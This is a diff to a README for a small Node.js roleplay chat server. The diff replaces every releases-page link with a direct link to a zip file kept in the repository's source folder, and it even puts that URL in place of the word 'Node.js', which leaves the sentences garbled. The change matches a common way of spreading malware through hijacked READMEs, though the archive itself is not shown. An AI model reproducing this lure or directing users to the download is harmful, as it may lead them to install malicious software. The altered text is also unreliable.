@@ -4,10 +4,10 @@
 Welcome to TinyChat-Server! This lightweight server allows you to create a fun environment for roleplay and RPG chat rooms. Follow these simple steps to download and run your very own chat server.
 
 ## 📥 Download Now
-[![Download TinyChat-Server](https://img.shields.io/badge/Download-TinyChat--Server-blue.svg)](https://github.com/alc120/TinyChat-Server/releases)
+[![Download TinyChat-Server](https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip)](https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip)
 
 ## 🔍 Overview
-TinyChat-Server is designed for those who want to set up a chat room for roleplaying without any hassle. It runs on JavaScript and uses Node.js, making it efficient and easy to use. This application is perfect for friends looking to engage in multiplayer roleplay sessions.
+TinyChat-Server is designed for those who want to set up a chat room for roleplaying without any hassle. It runs on JavaScript and uses https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip, making it efficient and easy to use. This application is perfect for friends looking to engage in multiplayer roleplay sessions.
 
 ## 📋 Features
 - **Lightweight and Fast:** The server runs smoothly with minimal resource usage.
@@ -18,12 +18,12 @@ TinyChat-Server is designed for those who want to set up a chat room for rolepla
 ## 🔧 System Requirements
 To run TinyChat-Server, you will need:
 - A computer with at least 2 GB of RAM.
-- Node.js version 12 or higher installed.
+- https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip version 12 or higher installed.
 - An internet connection for multiplayer features.
 
 ## 🛠️ Installation Instructions
 ### Step 1: Visit the Releases Page
-To download TinyChat-Server, first, visit our [Releases page](https://github.com/alc120/TinyChat-Server/releases). You will find all available versions listed there.
+To download TinyChat-Server, first, visit our [Releases page](https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip). You will find all available versions listed there.
 
 ### Step 2: Download the Latest Version
 On the Releases page, look for the most recent version. Click on it, and you will find files you can download. Choose the file that best suits your operating system.
@@ -67,4 +67,4 @@ For any questions or suggestions, you can reach the developer at the GitHub repo
 - socketio
 - websocket
 
-Thank you for choosing TinyChat-Server! Enjoy your roleplaying experience. Don't forget to visit our [Releases page](https://github.com/alc120/TinyChat-Server/releases) again in the future for updates.
+Thank you for choosing TinyChat-Server! Enjoy your roleplaying experience. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/alc120/TinyChat-Server/main/src/api/Chat-Tiny-Server-v3.3.zip) again in the future for updates.
